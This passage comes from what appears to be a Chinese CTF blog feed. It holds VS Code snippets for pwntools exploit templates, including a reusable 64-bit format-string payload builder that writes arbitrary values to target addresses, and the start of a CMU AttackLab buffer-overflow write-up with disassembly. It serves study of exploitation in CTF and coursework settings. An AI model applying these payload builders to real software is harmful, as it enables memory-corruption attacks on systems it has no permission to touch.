\&quot; + \&quot;\\033[1;31;40m\&quot; + content + \&quot;\\033[0m\&quot;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def exp():&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    pass&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;local = int(sys.argv[1])&quot;</span>,</span><br><span class="line">            <span class="string">&quot;elf = ELF(challenge)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;libc = ELF(libc_path)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;context.os = &#x27;linux&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;if local:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    io = process(challenge,env = &#123;\&quot;LD_PRELOAD\&quot;:libc_path&#125;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;else:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    io = remote(\&quot;node4.buuoj.cn\&quot;, 25965)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;if arch == 64:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    context.arch = &#x27;amd64&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;elif arch == 32:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    context.arch = &#x27;i386&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;p   = lambda      : pause() &quot;</span>,</span><br><span class="line">            <span class="string">&quot;s   = lambda x    : success(x)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;re  = lambda m, t : io.recv(numb=m, timeout=t)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ru  = lambda x    : io.recvuntil(x)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;rl  = lambda      : io.recvline()&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sd  = lambda x    : io.send(x)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sl  = lambda x    : io.sendline(x)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ia  = lambda      : io.interactive()&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sla = lambda a, b : io.sendlineafter(a, b)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sa  = lambda a, b : io.sendafter(a, b)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;uu32 = lambda x   : u32(x.ljust(4,b&#x27;\\x00&#x27;))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;uu64 = lambda x   : u64(x.ljust(8,b&#x27;\\x00&#x27;))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;bps = []&quot;</span>,</span><br><span class="line">            <span class="string">&quot;pie = 0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def gdba():&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if local == 0:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        return 0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    cmd =&#x27;set follow-fork-mode parent\\n&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if pie:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        base = int(os.popen(\&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;\&quot;.format(io.pid)).readlines()[1],16)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        cmd +=&#x27;&#x27;.join([&#x27;b *&#123;:#x&#125;\\n&#x27;.format(b+base) for b in bps])&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        cmd +=&#x27;set $base=&#123;:#x&#125;\\n&#x27;.format(base)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    else:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        cmd+=&#x27;&#x27;.join([&#x27;b *&#123;:#x&#125;\\n&#x27;.format(b) for b in bps])&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    gdb.attach(io,cmd)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;exp()&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ia()&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;menu&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;prefix&quot;</span>: <span class="string">&quot;menu&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;body&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;_add,_free,_edit,_show = 1,2,3,4&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;menu = \&quot;$1\&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def add(size, content):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(menu, str(_add))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(\&quot;\&quot;, str(size))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sa(\&quot;\&quot;, content)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def edit(idx, content):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(menu, str(_edit))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(\&quot;\&quot;, str(idx))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sa(\&quot;\&quot;, content)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def free(idx):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(menu, str(_free))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(\&quot;\&quot;, str(idx))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def show(idx):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(menu, str(_show))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(\&quot;\&quot;, str(idx))&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;64format&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;prefix&quot;</span>: <span class="string">&quot;64format&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;body&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;def format_string_template_64(location_arg,target,after_change,len_other_string = 0,ljust_location = 0x50,bit = 0x6):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &#x27;&#x27;&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    第一个参数是格式化字符串的位置，即第几个参数&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    第二个参数是要改哪里的值&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    第三个参数是把想把目标值改成什么值&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    第四个参数是看看在printf之前还有没有奇奇怪怪的字符串&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    第五个参数是ljust填补核心payload之后，让其0x8个字节对齐，默认是0x50&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    第六个参数是要覆盖的位数，默认为6&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &#x27;&#x27;&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 1:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 2:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low2 = (after_change &amp; 0xff00) &gt;&gt; 8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c2 = (low2 - low1 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg2 = location_arg1 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c2) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg2) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 3:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low2 = (after_change &amp; 0xff00) &gt;&gt; 8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low3 = (after_change &amp; 0xff0000) &gt;&gt; 16&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c2 = (low2 - low1 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c3 = (low3 - low2 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg2 = location_arg1 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg3 = location_arg2 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c2) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg2) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c3) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg3) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x2)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 4:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low2 = (after_change &amp; 0xff00) &gt;&gt; 8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low3 = (after_change &amp; 0xff0000) &gt;&gt; 16&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low4 = (after_change &amp; 0xff000000) &gt;&gt; 24&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c2 = (low2 - low1 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c3 = (low3 - low2 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c4 = (low4 - low3 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg2 = location_arg1 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg3 = location_arg2 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg4 = location_arg3 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c2) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg2) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c3) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg3) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c4) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg4) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x2)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x3)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 5:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low2 = (after_change &amp; 0xff00) &gt;&gt; 8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low3 = (after_change &amp; 0xff0000) &gt;&gt; 16&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low4 = (after_change &amp; 0xff000000) &gt;&gt; 24&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low5 = (after_change &amp; 0xff00000000) &gt;&gt; 32&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c2 = (low2 - low1 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c3 = (low3 - low2 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c4 = (low4 - low3 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c5 = (low5 - low4 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg2 = location_arg1 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg3 = location_arg2 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg4 = location_arg3 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg5 = location_arg4 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c2) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg2) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c3) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg3) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c4) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg4) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c5) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg5) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x2)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x3)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x4)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 6:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low2 = (after_change &amp; 0xff00) &gt;&gt; 8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low3 = (after_change &amp; 0xff0000) &gt;&gt; 16&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low4 = (after_change &amp; 0xff000000) &gt;&gt; 24&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low5 = (after_change &amp; 0xff00000000) &gt;&gt; 32&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low6 = (after_change &amp; 0xff0000000000) &gt;&gt; 40&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c2 = (low2 - low1 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c3 = (low3 - low2 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c4 = (low4 - low3 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c5 = (low5 - low4 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c6 = (low6 - low5 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg2 = location_arg1 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg3 = location_arg2 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg4 = location_arg3 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg5 = location_arg4 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg6 = location_arg5 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c2) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg2) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c3) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg3) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c4) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg4) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c5) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg5) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c6) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg6) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x2)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x3)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x4)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target + 0x5)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    return payload&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://lingze.xyz/book/pwn/env/">https://lingze.xyz/book/pwn/env/</a></li><li><a href="https://blog.sigmerc.top/post/PwnTemplate/">https://blog.sigmerc.top/post/PwnTemplate/</a></li><li><a href="https://code.visualstudio.com/docs/editor/userdefinedsnippets">https://code.visualstudio.com/docs/editor/userdefinedsnippets</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AttackLab</title>
      <link href="2021/07/18/AttackLab/"/>
      <url>2021/07/18/AttackLab/</url>
      
        <content type="html"><![CDATA[<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="touch1"><a href="#touch1" class="headerlink" title="touch1"></a>touch1</h2><p><img src="https://i.loli.net/2021/07/18/eP4hAwgymJpYRLi.png" alt=""></p><p>结合汇编代码可以确定返回地址距离我们输入的buf距离为0x28，查看Gets函数如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">Gets</span><span class="params">(<span class="keyword">char</span> *dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *i; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  gets_cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = dest; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = _IO_getc(infile);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">-1</span> || v2 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *i = v2;</span><br><span class="line">    save_char(v2);</span><br><span class="line">  &#125;</span><br><span class="line">  *i = <span class="number">0</span>;</span><br><span class="line">  save_term();</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以输入任意数量的字符</p><p>那就好办了，我们使用附件里的hex2raw文件构造输入，再用管道符输入到文件中即可</p><p>payload和attack效果如下:</p><p><img src="https://i.loli.net/2021/07/18/8xLTPegmUZyAs3i.png" alt=""></p><h2 id="touch2"><a href="#touch2" class="headerlink" title="touch2"></a>touch2</h2><p>不看IDA反汇编出来的伪代码了，感觉有点欺负人2333，直接objdump好了</p><p>从网上整了个nm配合objdump来反汇编指定函数的jio本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">vmlinux=<span class="variable">$1</span> </span><br><span class="line">symbol=<span class="variable">$2</span> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$vmlinux</span>&quot;</span> ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;usage : <span class="variable">$0</span> vmlinux symbol&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> </span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"> </span><br><span class="line">startaddress=$(nm -n <span class="variable">$vmlinux</span> | grep <span class="string">&quot;\w\s<span class="variable">$symbol</span>&quot;</span> | awk <span class="string">&#x27;&#123;print &quot;0x&quot;$1;exit&#125;&#x27;</span>) </span><br><span class="line">endaddress=$(nm -n <span class="variable">$vmlinux</span> | grep -A1 <span class="string">&quot;\w\s<span class="variable">$symbol</span>&quot;</span> | awk <span class="string">&#x27;&#123;getline; print &quot;0x&quot;$1;exit&#125;&#x27;</span>) </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$symbol</span>&quot;</span> ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;dump all symbol&quot;</span></span><br><span class="line">    objdump -d <span class="variable">$vmlinux</span> </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;start-address: <span class="variable">$startaddress</span>, end-address: <span class="variable">$endaddress</span>&quot;</span> </span><br><span class="line">    objdump -d <span class="variable">$vmlinux</span> --start-address=<span class="variable">$startaddress</span> --stop-address=<span class="variable">$endaddress</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>直接进touch2函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">start-address: 0x00000000004017ec, end-address: 0x000000000040184c</span><br><span class="line"></span><br><span class="line">ctarget:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  4017f0:89 fa                mov    %edi,%edx</span><br><span class="line">  4017f2:c7 05 e0 2c 20 00 02 movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:00 00 00 </span><br><span class="line">  4017fc:3b 3d e2 2c 20 00    cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401802:75 20                jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:be e8 30 40 00       mov    $0x4030e8,%esi</span><br><span class="line">  401809:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  40180e:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401813:e8 d8 f5 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:bf 02 00 00 00       mov    $0x2,%edi</span><br><span class="line">  40181d:e8 6b 04 00 00       callq  401c8d &lt;validate&gt;</span><br><span class="line">  401822:eb 1e                jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:be 10 31 40 00       mov    $0x403110,%esi</span><br><span class="line">  401829:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  40182e:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401833:e8 b8 f5 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:bf 02 00 00 00       mov    $0x2,%edi</span><br><span class="line">  40183d:e8 